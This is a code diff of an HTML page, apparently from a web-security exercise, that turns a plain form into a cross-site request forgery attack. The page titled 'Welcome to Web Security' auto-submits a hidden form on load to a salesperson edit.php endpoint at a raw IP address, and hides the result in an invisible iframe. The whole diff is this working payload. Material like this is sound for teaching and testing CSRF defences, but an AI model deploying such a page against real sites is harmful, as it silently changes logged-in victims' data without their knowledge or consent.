@@ -1,6 +1,14 @@
-<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_users">
 
-<input type="hidden" name="first_name" value="Web"/>
-<input type="hidden" name="last_name" value="Security"/>
-<input type="submit" value="Update"/>
-</form>
+
+<html>
+  <head>
+    <title>Welcome to Web Security</title>
+  </head>
+  <body onload="document.edit_salesperson.submit()">
+    <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=11" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Web" />
+      <input type="text" name="last_name" value="Security" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
